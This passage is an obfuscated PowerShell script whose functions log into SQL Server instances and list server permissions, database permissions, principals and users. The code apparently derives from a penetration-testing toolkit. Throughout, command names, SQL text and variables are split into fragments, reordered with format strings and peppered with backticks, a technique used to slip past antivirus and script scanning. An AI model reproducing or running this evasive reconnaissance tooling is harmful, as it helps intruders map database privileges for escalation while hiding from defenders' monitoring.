 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'audit'+'_i'+'d '+'as'+' '+'[Au'+'d'+'itId]'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a.'+'name '+'as'+' '+'[Au'+'di'+'tNa'+'me],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s.'+'name '+'a'+'s '+'['+'AuditSp'+'ecif'+'ica'+'tion]'+','+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'d'+'.'+'a'+'u'+'dit_action_na'+'me '+'a'+'s '+'[Aud'+'it'+'Act'+'i'+'on],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s.is_state_'+'enable'+'d,'+'
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'d.is_'+'gro'+'up'+',
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'d.a'+'udit'+'_'+'act'+'ion_i'+'d '+'a'+'s '+'[Au'+'ditActi'+'o'+'nId],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s.'+'create_dat'+'e'+',
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s'+'.'+'modif'+'y_dat'+'e
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'FRO'+'M '+'sys.'+'server'+'_aud'+'its '+'A'+'S '+'a
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'JOI'+'N '+'sys'+'.'+'s'+'e'+'rv'+'er_audit'+'_s'+'pe'+'cific'+'ations '+'AS'+' '+'s
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'O'+'N '+'a'+'.a'+'u'+'dit'+'_guid '+'= '+'s.audit'+'_g'+'uid'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'J'+'OIN '+'s'+'y'+'s.'+'ser'+'ver_audit_s'+'pe'+'cification_detai'+'ls '+'AS'+' '+'d'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ON'+' '+'s'+'.ser'+'ver_spe'+'cificatio'+'n_'+'i'+'d '+'= '+'d.server'+'_speci'+'f'+'icati'+'on_i'+'d'+' '+'W'+'HE'+'RE '+'1'+'=1
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$AuditNameFilter
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$SpecNameFilter
 "+' '+' '+' '+' '+' '+' '+' '+"$ActionNameFilter")

        
        ${tblr`e`S`ULTs} = &("{0}{2}{1}" -f 'Ge','QLQuery','t-S') -Instance ${instaN`CE} -Query ${Q`UErY} -Username ${USer`NA`Me} -Password ${PA`ssW`oRd} -SuppressVerbose

        
        ${tB`LAUDITsErv`Er`Sp`eC}  = ${tB`l`AUdiTse`RV`eRsP`Ec}  + ${Tblr`Es`U`lts}
    }

    End
    {
        
        ${tbL`A`U`DitsE`RvE`RSpeC}
    }
}






Function  Get-s`QLser`V`erPRiv
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MAndATORY = ${f`ALsE},
        HelPmESsagE = {"{6}{12}{3}{2}{11}{7}{4}{8}{9}{0}{10}{5}{1}"-f'thent','.','om','r d','un','te with','SQL Server ','cco','t t','o au','ica','ain a','o'})]
        [string]${USe`RnA`ME},

        [Parameter(mAndAtory = ${f`A`lSe},
        HelpmeSsaGE = {"{11}{1}{14}{7}{16}{12}{2}{13}{10}{4}{0}{17}{5}{9}{15}{6}{3}{8}" -f'passw','S','main',' wi','count ',' t','enticate','rv','th.','o aut','c','SQL ','o',' a','e','h','er or d','ord'})]
        [string]${pAS`sWo`Rd},

        [Parameter(mANDaTorY = ${f`AlSe},
        hElpMEssAGe = {"{3}{1}{5}{2}{0}{4}" -f 'ti','indows c','eden','W','als.','r'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${CReDe`N`T`iAl} =   (DIr  vARiaBLe:0459M2 ).vaLUe::"E`Mpty",

        [Parameter(MaNdatORY = ${FA`LSe},
                VAlueFRomPIPelineBYproPERtyNaME = ${T`RUE},
        heLPMessage = {"{4}{2}{6}{0}{7}{1}{5}{3}"-f 'stanc','nec','QL Server i','to.','S','tion ','n','e to con'})]
        [string]${InSt`AnCe},

        [Parameter(mANdaTorY = ${F`Alse},
                vALuEFRoMPiPelIne = ${T`RUe},
                VaLUefRoMpIpeLiNEBYpROpeRTyNamE = ${tR`Ue},
        hElPMEssAGE = {"{1}{2}{3}{0}"-f 'me.','Per','m','ission na'})]
        [string]${p`ErMI`SSIo`NN`Ame},

        [Parameter(mANdatOry = ${F`ALSE},
        HELpmeSsaGe = {"{13}{9}{3}{16}{11}{15}{2}{10}{5}{6}{14}{8}{1}{4}{12}{7}{0}"-f '.','i','U','ess ver','s ','ed w','he','d',' ','pr','s','e','wrappe','Sup','n function','rrors.  ','bose '})]
        [switch]${s`UPp`REssv`eRB`Ose}
    )

    Begin
    {
        
        ${t`BLServ`ERPRIVS} = &("{0}{2}{1}{3}"-f 'Ne','bjec','w-O','t') -TypeName ("{0}{4}{2}{1}{3}"-f 'S','t','Data.Da','aTable','ystem.')

        
        if(${PER`mi`SSiOn`NamE})
        {
            ${PeRmissiO`N`NaM`E`F`I`ltEr} = (' '+'WHER'+'E '+'PER'+'.'+'p'+'ermission'+'_nam'+'e '+'like'+' '+"'$PermissionName'")
        }
        else
        {
            ${Pe`RM`Is`siO`NnAMEFILTER} = ''
        }
    }

    Process
    {
        

        
        ${c`OMPu`TE`RN`AME} = &("{0}{1}{4}{3}{2}" -f 'Get-ComputerNameFrom','Inst','e','nc','a') -Instance ${INsTAn`ce}

        
        if(-not ${inst`ANcE})
        {
            ${InS`TAnce} = ${enV`:`C`OM`P`UternAme}
        }

        
        ${t`eStCOnN`eCTIon} = &("{0}{5}{3}{2}{1}{4}"-f'G','QLCo','-S','t','nnectionTest','e') -Instance ${i`NsTa`Nce} -Username ${u`SeRnA`mE} -Password ${pAssWo`Rd} -Credential ${cr`eDE`NtI`Al} -SuppressVerbose | &("{0}{2}{3}{1}"-f'Whe','t','re-Obj','ec') -FilterScript {
            ${_}."Sta`TUs" -eq ("{3}{0}{1}{2}"-f'essib','l','e','Acc')
        }
        if(${t`E`StCONNEctIoN})
        {
            if( -not ${S`UP`presSve`R`BO`Se})
            {
                &("{0}{1}{3}{2}" -f 'Write-','V','ose','erb') -Message ("$Instance "+': '+'Conn'+'ectio'+'n '+'Succes'+'s'+'.')
            }
        }
        else
        {
            if( -not ${sUPP`Res`Sv`erb`ose})
            {
                &("{2}{1}{3}{0}"-f'erbose','rite-','W','V') -Message ("$Instance "+': '+'Co'+'nne'+'ct'+'ion '+'Failed'+'.')
            }
            return
        }

        
        ${qU`E`RY} = (' '+' '+'SELE'+'CT '+' '+"'$ComputerName' "+'a'+'s '+'[Co'+'mpute'+'rNam'+'e]'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'a'+'s '+'[Inst'+'a'+'n'+'ce],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'GRE.na'+'m'+'e '+'as'+' '+'[G'+'rante'+'e'+'Name'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'GR'+'O.na'+'me '+'as'+' '+'[Gra'+'ntorNam'+'e],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'PER.cla'+'ss_d'+'esc '+'as'+' '+'['+'Permissi'+'onCla'+'ss],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'PER.p'+'er'+'m'+'ission_name '+'as'+' '+'['+'Perm'+'issio'+'nName]'+','+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'PE'+'R.st'+'ate_'+'d'+'esc '+'as'+' '+'['+'Permis'+'sio'+'nS'+'ta'+'te]'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'CO'+'AL'+'ESC'+'E(PRC'+'.name,'+' '+'EP.na'+'m'+'e, '+(('NiFZ'+'iFZ'+') ')-CrePlAce ([CHar]105+[CHar]70+[CHar]90),[CHar]39)+'a'+'s '+'[Obje'+'ct'+'Nam'+'e],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'COALE'+'SCE'+'(P'+'RC'+'.typ'+'e_'+'desc, '+'EP'+'.type_'+'desc, '+('N{'+'0}'+'{0})'+' ')-f [CHAr]39+'as'+' '+'['+'ObjectT'+'ype]'+'
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'FROM'+' '+'[sy'+'s]'+'.[s'+'erver'+'_'+'per'+'m'+'issions] '+'a'+'s '+'PER
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'I'+'NNER '+'J'+'OIN '+'sys.se'+'rve'+'r'+'_'+'principals '+'as'+' '+'G'+'RO
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ON'+' '+'PER.gr'+'anto'+'r'+'_pr'+'i'+'ncipa'+'l_id '+'= '+'G'+'RO.prin'+'cip'+'a'+'l_id
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'INNER'+' '+'JO'+'IN '+'sys'+'.ser'+'ver_'+'pri'+'nci'+'pa'+'ls '+'a'+'s '+'GR'+'E
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ON'+' '+'PE'+'R.gran'+'tee_'+'pr'+'inc'+'ipal_id'+' '+'= '+'GRE.principal_i'+'d'+'
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'LEF'+'T '+'JOI'+'N '+'s'+'ys'+'.serv'+'er'+'_pr'+'inc'+'ipals '+'as'+' '+'PRC
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ON'+' '+'P'+'ER'+'.class'+' '+'= '+'101'+' '+'AN'+'D '+'PER.maj'+'or_id'+' '+'= '+'PRC.pr'+'inci'+'pal'+'_id
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'L'+'EFT '+'JOI'+'N '+'sys.e'+'n'+'dpo'+'in'+'ts '+'A'+'S '+'EP'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ON'+' '+'PE'+'R'+'.class '+'= '+'105'+' '+'A'+'ND '+'PER.'+'ma'+'jor_id '+'= '+'E'+'P.end'+'p'+'oint_id'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$PermissionNameFilter
 "+' '+' '+' '+' '+' '+' '+' '+'O'+'RDER'+' '+'B'+'Y '+'Gran'+'teeNa'+'m'+'e,Permiss'+'ion'+'N'+'a'+'me;')

        
        ${tBLsE`RVER`pR`Iv`S`TEmP} = &("{0}{1}{2}"-f'Get-','SQ','LQuery') -Instance ${iN`STAnce} -Query ${qU`e`RY} -Username ${USE`RnA`Me} -Password ${PaS`s`word} -Credential ${c`R`EdenT`IAl} -SuppressVerbose

        
        ${t`BLserVe`R`p`RIvS} = ${tB`L`SE`RVeRpr`iVs} + ${t`BLSERv`e`RP`RIVSt`Emp}
    }

    End
    {
        
        ${Tb`LseR`V`erp`RIvS}
    }
}






Function  Get-s`QlDaTABA`SeP`RIV
{
    
    [CmdletBinding()]
    Param(
        [Parameter(mandAtOry = ${Fa`Lse},
        HelPMessAGe = {"{6}{1}{4}{0}{8}{2}{5}{7}{3}" -f'main','Server o','ccount to a','e with.','r do','uthenti','SQL ','cat',' a'})]
        [string]${u`s`ERnamE},

        [Parameter(ManDatORy = ${FA`LSE},
        hELpMESsAge = {"{13}{8}{9}{17}{15}{10}{16}{12}{11}{5}{7}{6}{1}{0}{3}{2}{14}{4}"-f'ic','uthent','te w','a','h.','ount p','ord to a','assw','L',' S','d','c','in ac','SQ','it','ver or ','oma','er'})]
        [string]${Pas`s`wOrD},

        [Parameter(maNdATory = ${F`Al`sE},
        HelpmEsSaGe = {"{3}{2}{0}{1}" -f'ntia','ls.','ede','Windows cr'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${C`ReDE`N`TiaL} =  $0459M2::"e`MPty",

        [Parameter(mAnDAtorY = ${fa`lsE},
                vaLUefrompiPeLINebYpROpErtyNAmE = ${TR`UE},
        HeLpmEssagE = {"{4}{2}{6}{3}{7}{0}{5}{8}{1}"-f'ver i','onnection to.','Q','e','S','nstan','L S','r','ce to c'})]
        [string]${instAn`ce},

        [Parameter(manDATOrY = ${F`A`lse},
                ValUEfromPiPeliNEByPRoPERtYname = ${t`Rue},
        hELPMESSAGe = {"{1}{10}{2}{6}{4}{3}{5}{8}{7}{9}{0}" -f 'r.','S',' Serv','base na','a','me ','er dat','ilt','to f','er fo','QL'})]
        [string]${D`ATaBa`SENAme},

        [Parameter(MANDAtOry = ${fa`l`Se},
                VALuefROMpIpEliNebYPROpErTyNaMe = ${tr`Ue},
        HelpMeSsaGe = {"{3}{1}{0}{4}{2}{6}{7}{5}"-f'miss','r','n name t','Pe','io',' for.','o ','filter'})]
        [string]${PErMIsS`I`on`NA`ME},

        [Parameter(ManDAtOry = ${f`Al`SE},
                VaLuefROMpIpELiNeBYpropeRTYname = ${tr`Ue},
        hELPMESsaGE = {"{3}{8}{7}{0}{2}{5}{4}{1}{6}"-f' t','ter','o ','Perm','l','fi',' for.',' type','ission'})]
        [string]${P`er`M`IssI`oNTyPE},

        [Parameter(mAndatORy = ${FAL`Se},
                vALUEFROmPipelInebYPrOpERTYName = ${TR`UE},
        heLPMesSaGE = {"{1}{7}{8}{0}{2}{6}{3}{9}{5}{4}" -f 'ame ','Principa','for g','ee to',' for.','lter','rant','l ','n',' fi'})]
        [string]${P`RInC`iP`A`LName},

        [Parameter(maNDATorY = ${f`ALse},
                vAlUeFRoMpiPeliNEbyPropertYNaMe = ${t`Rue},
        HElPMEsSAGe = {(("{11}{1}{5}{4}{6}{9}{10}{8}{3}{0}{2}{7}"-f 'as','Xx','es','lt datab','select','t ',' ','.','defau','permissi','ons for ','Dono'))."RePLA`Ce"(([char]111+[char]88+[char]120),[StrInG][char]39)})]
        [switch]${NOdEF`AU`L`TS},

        [Parameter(mAnDATory = ${fA`l`SE},
        HelPmESsaGe = {"{6}{4}{0}{12}{8}{7}{3}{1}{11}{2}{9}{10}{5}"-f 'ver','ion ','s w','when funct','ppress ','ed.','Su','errors.  Used ','se ','ra','pp','i','bo'})]
        [switch]${Su`p`PrESSV`erbOSE}
    )

    Begin
    {
        
        ${t`BlDAT`ABASEPrI`VS} = &("{0}{2}{1}"-f'N','ct','ew-Obje') -TypeName ("{1}{3}{0}{2}"-f 'ab','System.D','le','ata.DataT')

        
        if(${pE`RmiS`sIo`N`NaMe})
        {
            ${Pe`R`MIssIonnaM`Ef`IL`Ter} = (' '+'an'+'d '+'p'+'m'+'.p'+'e'+'rmission_nam'+'e '+'li'+'ke '+"'$PermissionName'")
        }
        else
        {
            ${p`eRMIsS`iOnnAmE`F`IL`T`er} = ''
        }

        
        if(${Pri`NCipALn`Ame})
        {
            ${PRInC`Ip`A`LNAmefI`lT`eR} = (' '+'and'+' '+'rp.'+'name'+' '+'like'+' '+"'$PrincipalName'")
        }
        else
        {
            ${Pr`Inc`IpAlnA`MEfI`l`Ter} = ''
        }

        
        if(${peR`mIs`SiOnT`yPE})
        {
            ${permISSi`OnTY`p`E`Fil`TeR} = (' '+'and'+' '+'pm.'+'cl'+'ass_d'+'es'+'c '+'li'+'ke '+"'$PermissionType'")
        }
        else
        {
            ${peRMISSio`Ntyp`EFIl`TER} = ''
        }
    }

    Process
    {
        

        
        ${COM`PUtER`NaMe} = &("{0}{3}{6}{5}{1}{4}{2}" -f 'Ge','Insta','ce','t','n','mputerNameFrom','-Co') -Instance ${ins`TaNce}

        
        if(-not ${I`Nst`ANCE})
        {
            ${i`NsT`Ance} = ${ENV:`cOmpUt`Ern`AmE}
        }

        
        if(${N`oDEFau`L`Ts})
        {
            
            ${tBlD`A`T`AbASeS} = &("{2}{1}{3}{0}"-f'ase','t-SQLD','Ge','atab') -Instance ${In`stAN`cE} -Username ${User`Na`ME} -Password ${pAs`s`wOrd} -Credential ${cr`Ed`en`Tial} -DatabaseName ${dAtAb`AseN`AmE} -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            
            ${T`B`lDATa`BAseS} = &("{0}{1}{2}" -f'Get-','SQLDatabas','e') -Instance ${I`NsTa`N`cE} -Username ${uS`erN`AMe} -Password ${PaS`Sw`oRd} -Credential ${c`R`edENtIAL} -DatabaseName ${DA`T`ABaSEnAMe} -HasAccess -SuppressVerbose
        }

        
        ${tbl`D`At`AbASes} |
        &("{0}{2}{4}{1}{3}"-f 'F','h-','or','Object','Eac') -Process {
            
            ${D`Bn`Ame} = ${_}."D`ATa`BAS`enamE"

            
            ${Q`U`erY} = (' '+' '+'U'+'SE '+"$DbName;
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SEL'+'E'+'CT '+' '+"'$ComputerName' "+'a'+'s '+'['+'Co'+'mputer'+'Name]'+',
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'a'+'s '+'[Ins'+'tance]'+',
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$DbName' "+'a'+'s '+'['+'Datab'+'aseNa'+'me],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'rp.name'+' '+'a'+'s '+'[Pri'+'n'+'cipa'+'l'+'Nam'+'e],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'r'+'p.t'+'ype_desc '+'as'+' '+'[Pri'+'n'+'cipalType'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'pm.cl'+'a'+'ss_d'+'esc '+'as'+' '+'[Permiss'+'io'+'nT'+'ype],'+'
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'pm.p'+'e'+'rmis'+'sion_name'+' '+'a'+'s '+'[Per'+'mis'+'si'+'onNam'+'e],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'pm.state_'+'d'+'esc '+'as'+' '+'[State'+'Descripti'+'on],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Obj'+'ectType'+' '+'= '+'C'+'AS'+'E
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'WHEN'+' '+'obj'+'.t'+'ype_'+'desc'+' '+'I'+'S '+'NULL
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'OR'+' '+'obj.'+'typ'+'e_de'+'s'+'c '+'= '+('fACSYSTEM_'+'T'+'A'+'BL'+'EfAC ')."R`ePla`Ce"(([CHAr]102+[CHAr]65+[CHAr]67),[strInG][CHAr]39)+'TH'+'EN
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'pm.cl'+'a'+'ss_desc'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'E'+'LSE
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'o'+'bj.'+'t'+'ype'+'_desc
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'END'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'['+'Ob'+'j'+'ectName] '+'= '+'Isnul'+'l'+'('+'ss.name, '+'O'+'bject_na'+'me(p'+'m.majo'+'r_i'+'d))
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'FRO'+'M '+' '+' '+"$DbName.sys.database_principals "+'rp
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'INN'+'ER '+'JOIN'+' '+"$DbName.sys.database_permissions "+'pm
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ON'+' '+'pm'+'.'+'grante'+'e_'+'p'+'rinci'+'pal_id '+'= '+'rp.'+'princ'+'ip'+'al_id
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'LEF'+'T '+'J'+'OIN '+"$DbName.sys.schemas "+'ss
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ON'+' '+'pm.ma'+'jor'+'_id '+'= '+'ss.sc'+'hema_id'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'LEFT'+' '+'JOI'+'N '+"$DbName.sys.objects "+'o'+'bj
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'O'+'N '+'pm.'+'[major'+'_i'+'d] '+'= '+'obj.[object'+'_i'+'d] '+'WHER'+'E'+' '+'1=1
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$PermissionTypeFilter
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$PermissionNameFilter
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$PrincipalNameFilter")

            
            if(-not ${s`UpPr`esSVerBo`Se})
            {
                &("{0}{2}{1}" -f'Write','ose','-Verb') -Message ("$Instance "+': '+'Gra'+'b'+'bing '+'perm'+'i'+'ssio'+'ns '+'for'+' '+'th'+'e '+"$DbName "+'datab'+'a'+'se.'+'..')
            }

            ${TBlDa`Ta`BA`SEt`emp} = &("{2}{1}{0}{3}" -f'SQL','t-','Ge','Query') -Instance ${iNS`TA`NCe} -Query ${quE`RY} -Username ${u`sERn`AME} -Password ${P`A`s`swOrd} -Credential ${Cre`D`enTI`Al} -SuppressVerbose

            
            ${t`BLdATABa`SE`pRIVS} = ${TbLDATA`BA`sEPrI`VS} + ${T`BLDaTaba`Set`E`mp}
        }
    }

    End
    {
        
        ${tBLD`A`Ta`BasePRivS}
    }
}






Function  G`Et`-SqlDa`TABASEUSEr
{
    
    [CmdletBinding()]
    Param(
        [Parameter(mAndatORY = ${F`A`LSE},
        HELPmESsage = {"{14}{9}{7}{1}{5}{0}{11}{2}{13}{8}{3}{6}{4}{12}{10}" -f'or ','rver','in',' authe','t',' ','n','e','nt to','QL S','.','doma','icate with',' accou','S'})]
        [string]${UsERN`A`ME},

        [Parameter(MANdatory = ${FA`Lse},
        hELPMEssAge = {"{17}{11}{2}{1}{13}{16}{15}{8}{3}{7}{10}{4}{12}{6}{9}{14}{5}{0}"-f 'th.','do','or ',' passw','ti','i','a','ord to ','t','t','authen','Server ','c','main acc','e w','un','o','SQL '})]
        [string]${P`ASsWO`Rd},

        [Parameter(MANDATORy = ${F`AlSe},
        HElPmesSAgE = {"{5}{3}{2}{4}{1}{0}" -f 'tials.','n','ow','d','s crede','Win'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${CR`E`dEnTIAL} =   (VARiablE 0459m2 -vA  )::"Em`PtY",

        [Parameter(MAnDatORY = ${fa`L`SE},
                VaLUEfROmpiPelInebYPrOpERTYnaMe = ${TR`Ue},
        hELpmesSaGE = {"{6}{5}{1}{3}{7}{2}{8}{0}{10}{4}{9}"-f 'to con','n','ce','s','ion to','erver i','SQL S','tan',' ','.','nect'})]
        [string]${In`S`T`AnCE},

        [Parameter(MAnDaTORy = ${FA`L`SE},
                VALueFroMPIpELiNeByprOPERtYNAMe = ${tr`Ue},
        HelpMesSAgE = {"{2}{1}{0}{3}{6}{4}{7}{5}"-f' Se','L','SQ','r','tabase n','e.','ver da','am'})]
        [string]${d`AtA`B`AsEN`AMe},

        [Parameter(mAndATOrY = ${FA`L`se},
                VAlUefrOmpIpELInebypRopErtYNAme = ${T`RuE},
        heLPmessAGe = {"{1}{3}{0}{2}"-f 'e ','Dat','user.','abas'})]
        [string]${DatAb`A`SE`User},

        [Parameter(mAnDatOrY = ${fal`SE},
                VALueFromPIpElINEBypRopertYName = ${tR`UE},
        HELPmessAge = {"{2}{3}{1}{0}"-f'n.','ogi','Ser','ver l'})]
        [string]${PrI`N`c`iPAlnAMe},

        [Parameter(MAndatOry = ${fA`LsE},
                ValuEfrOmpIPeLineByPropertYnAME = ${T`RuE},
        HelPMeSSAGE = {"{4}{2}{3}{6}{10}{1}{9}{5}{7}{0}{8}" -f't databa',' as',' ','not show datab','Do','ed with','as',' defaul','ses.','sociat','e users'})]
        [Switch]${nODefA`U`L`TS},

        [Parameter(MAnDaTORY = ${F`AL`se},
        HelpmESsage = {"{0}{7}{6}{3}{4}{8}{1}{2}{9}{5}{10}" -f 'S','hen',' fu',' err','ors. ','ion',' verbose','uppress',' Used w','nct',' is wrapped.'})]
        [switch]${S`UPpR`essVEr`BOse}
    )

    Begin
    {
        
        ${tBL`d`AtaBaseuse`RS} = &("{0}{1}{2}{3}" -f'New-','Ob','j','ect') -TypeName ("{2}{0}{6}{5}{4}{3}{1}" -f 'yste','ble','S','a','ata.DataT','D','m.')
        ${N`Ull} = ${TB`ldA`TA`BaSEU`SErs}."C`OLU`MnS".("{1}{0}" -f 'd','Ad').Invoke(("{2}{0}{1}" -f'omp','uterName','C'))
        ${n`UlL} = ${Tb`l`DaTaBAseU`SE`Rs}."c`oLum`Ns".("{0}{1}"-f 'Ad','d').Invoke(("{2}{0}{1}" -f'stan','ce','In'))
        ${n`UlL} = ${TBLDa`TaBa`sEuse`Rs}."COLu`mNs".("{0}{1}"-f'Ad','d').Invoke(("{1}{3}{2}{0}"-f'baseName','D','a','at'))
        ${nu`LL} = ${TbldaTa`BA`S`eUs`E`Rs}."CO`LUmns".("{1}{0}" -f 'dd','A').Invoke(("{2}{0}{1}{3}" -f'abaseUse','r','Dat','Id'))
        ${N`Ull} = ${TblD`ATaB`Aseu`se`Rs}."co`lu`Mns".("{1}{0}" -f 'd','Ad').Invoke(("{1}{2}{0}" -f'User','Databa','se'))
        ${n`UlL} = ${tbldAT`Ab`ASEuSE`RS}."coLu`MnS".("{0}{1}"-f 'A','dd').Invoke(("{1}{0}{3}{2}"-f'ip','Princ','lSid','a'))
        ${n`ULL} = ${TbldAta`B`As`e`UsErs}."CoL`UmNs".("{0}{1}"-f'A','dd').Invoke(("{1}{2}{0}"-f'ipalName','Pr','inc'))
        ${nu`lL} = ${tBL`dATabaS`EuS`eRs}."c`OLUmns".("{1}{0}" -f 'd','Ad').Invoke(("{3}{4}{0}{1}{2}"-f 'alTy','p','e','Prin','cip'))
        ${n`ULL} = ${tbLDA`TAbaS`eu`SErs}."cOlU`mnS".("{0}{1}" -f'A','dd').Invoke(("{5}{0}{3}{2}{4}{1}"-f't','name','hem','_sc','a_','deaul'))
        ${Nu`Ll} = ${tBld`ATAbAS`euS`ERS}."Co`LuMns".("{0}{1}" -f 'Ad','d').Invoke(("{2}{1}{0}{3}" -f't','ea','cr','e_date'))
        ${N`Ull} = ${tBLdA`Ta`B`ASEuS`e`Rs}."cOLu`M`Ns".("{0}{1}"-f 'A','dd').Invoke(("{3}{0}{1}{2}"-f's_fixed','_','role','i'))

        
        if(${prIN`CIPA`l`NA`mE})
        {
            ${pRincip`AL`N`AMeF`iLt`Er} = (' '+'an'+'d '+'b.na'+'me'+' '+'like'+' '+"'$PrincipalName'")
        }
        else
        {
            ${PrIncI`PaLnA`mef`ilt`er} = ''
        }

        
        if(${d`ATAB`A`se`UseR})
        {
            ${Da`TaBASeUSe`RfIl`TeR} = (' '+'an'+'d '+'a.n'+'am'+'e '+'l'+'ike '+"'$DatabaseUser'")
        }
        else
        {
            ${daTA`BAs`Eu`sErfiltEr} = ''
        }
    }

    Process
    {
        

        
        ${COMpU`T`e`RnAmE} = &("{3}{4}{2}{0}{1}" -f'put','erNameFromInstance','m','G','et-Co') -Instance ${iN`s`TAnCe}

        
        if(-not ${in`StA`NCE})
        {
            ${I`NStA`Nce} = ${ENv:c`ompU`TerNA`ME}
        }


        
        ${tEstCo`N`NE`C`TiON} = &("{3}{0}{2}{1}"-f'et-SQLCo','ctionTest','nne','G') -Instance ${iNS`T`A`NCe} -Username ${USe`R`NAMe} -Password ${p`A`sSwoRd} -Credential ${crE`Denti`AL} -SuppressVerbose | &("{2}{0}{1}"-f 'h','ere-Object','W') -FilterScript {
            ${_}."st`ATUs" -eq ("{2}{1}{0}"-f'ble','ssi','Acce')
        }
        if(${T`E`sTco`NneCTiOn})
        {
            if( -not ${sUp`P`R`essVErB`osE})
            {
                &("{1}{2}{0}"-f 'e','Write-Ve','rbos') -Message ("$Instance "+': '+'Co'+'nne'+'ction '+'Su'+'cce'+'ss.')
            }
        }
        else
        {
            if( -not ${Su`Pp`REs`Sverbo`SE})
            {
                &("{1}{0}{2}{3}"-f 't','Wri','e','-Verbose') -Message ("$Instance "+': '+'Con'+'nect'+'io'+'n '+'Fai'+'le'+'d.')
            }
            return
        }

        
        if(${nOdE`F`AuLTs})
        {
            ${TB`l`d`ATA`BASES} = &("{1}{0}{3}{2}" -f'et-S','G','se','QLDataba') -Instance ${I`NsTaN`Ce} -Username ${UsE`Rname} -Password ${Pas`Sw`ORD} -Credential ${C`REDE`Ntial} -HasAccess -DatabaseName ${DAtA`Bas`e`NAmE} -SuppressVerbose  -NoDefaults
        }
        else
